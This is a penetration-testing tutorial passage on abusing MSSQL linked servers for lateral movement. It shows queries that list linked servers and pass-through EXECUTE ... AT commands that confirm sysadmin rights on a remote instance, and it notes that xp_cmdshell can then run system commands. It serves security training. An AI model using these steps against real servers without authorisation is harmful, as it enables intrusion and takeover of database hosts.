## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

#### Identify linked Servers in MSSQL

  Attacking SQL Databases

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

  Attacking SQL Databases

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database), and [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.
